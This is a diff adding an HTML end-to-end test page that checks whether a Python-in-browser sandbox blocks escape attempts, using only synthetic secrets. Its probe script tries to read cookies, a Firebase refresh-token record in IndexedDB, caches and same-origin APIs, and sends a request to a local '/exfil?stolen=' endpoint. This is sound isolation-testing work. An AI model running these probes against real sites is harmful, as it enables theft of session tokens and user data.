@@ -1,0 +1,59 @@
+<!doctype html><meta charset="utf-8"><title>Python sandbox e2e</title>
+<body><h3>Python sandbox end-to-end page (synthetic data only)</h3>
+<script src="python-runner.sandbox.bundle.js"></script>
+<script>
+// Seed synthetic same-origin state a real session would hold (the HttpOnly cookie comes from the server on "/").
+window.seedState = async () => {
+  localStorage.setItem('synthetic_localStorage_secret', 'LS-SECRET');
+  await new Promise((ok, bad) => {
+    const r = indexedDB.open('firebaseLocalStorageDb', 1);
+    r.onupgradeneeded = () => r.result.createObjectStore('firebaseLocalStorage', { keyPath: 'fbase_key' });
+    r.onsuccess = () => { const tx = r.result.transaction('firebaseLocalStorage', 'readwrite'); tx.objectStore('firebaseLocalStorage').put({ fbase_key: 'firebase:authUser:SYNTHETIC', value: { refreshToken: 'SYNTHETIC-REFRESH-TOKEN' } }); tx.oncomplete = ok; };
+    r.onerror = bad;
+  });
+  const c = await caches.open('synthetic-cache'); await c.put('/x', new Response('CACHE-SECRET'));
+  await fetch('/');
+};
+window.PROBE_SRC = `
+import js, json, asyncio
+from pyodide.ffi import to_js, create_proxy
+out = {}
+async def t(name, coro):
+    try:
+        # A CSP-blocked fetch REJECTS in Chromium/Firefox but stays pending forever in WebKit; either way no data is
+        # returned. The timeout turns "pending forever" into an explicit BLOCKED result instead of hanging the run.
+        out[name] = await asyncio.wait_for(coro, 6)
+    except Exception as e:
+        out[name] = 'BLOCKED/ERR: ' + type(e).__name__ + ': ' + str(e)[:90]
+async def same_origin_api():
+    r = await js.fetch('http://localhost:4173/api/whoami', to_js({'credentials': 'include'}, dict_converter=js.Object.fromEntries))
+    return await r.text()
+async def exfil():
+    r = await js.fetch('http://localhost:4174/exfil?stolen=hello', to_js({'mode': 'no-cors'}, dict_converter=js.Object.fromEntries))
+    return 'request sent, type=' + str(r.type)
+async def idb_read():
+    import asyncio
+    fut = asyncio.get_event_loop().create_future()
+    req = js.indexedDB.open('firebaseLocalStorageDb')
+    def ok(ev):
+        g = req.result.transaction('firebaseLocalStorage').objectStore('firebaseLocalStorage').getAll()
+        g.onsuccess = create_proxy(lambda e: fut.set_result(js.JSON.stringify(g.result)))
+    req.onsuccess = create_proxy(ok)
+    req.onerror = create_proxy(lambda e: fut.set_exception(Exception('idb error')))
+    return await asyncio.wait_for(fut, 3)
+async def cache_read():
+    c = await js.caches.open('synthetic-cache'); r = await c.match('http://localhost:4173/x'); return await r.text()
+async def ws():
+    s = js.WebSocket.new('ws://localhost:4174/'); return 'WebSocket created readyState=' + str(s.readyState)
+async def xhr_sync():
+    x = js.XMLHttpRequest.new(); x.open('GET', 'http://localhost:4173/api/whoami', False); x.send(); return x.responseText
+async def cookie():
+    return 'document.cookie visible: ' + str(js.document.cookie) if hasattr(js, 'document') else 'no document in worker'
+async def dyn_import():
+    r = await js.eval("import('http://localhost:4174/x.js').then(()=> 'dynamic import resolved').catch(e=> 'dynamic import: '+e.name)")
+    return str(r)
+for name, fn in [('same_origin_api_with_cookie', same_origin_api), ('cross_origin_exfil', exfil), ('indexedDB_read_auth_record', idb_read), ('cache_read', cache_read), ('websocket', ws), ('xhr_sync_same_origin', xhr_sync), ('document_cookie', cookie), ('dynamic_import', dyn_import)]:
+    await t(name, fn())
+print(json.dumps(out))
+`;
+</script>
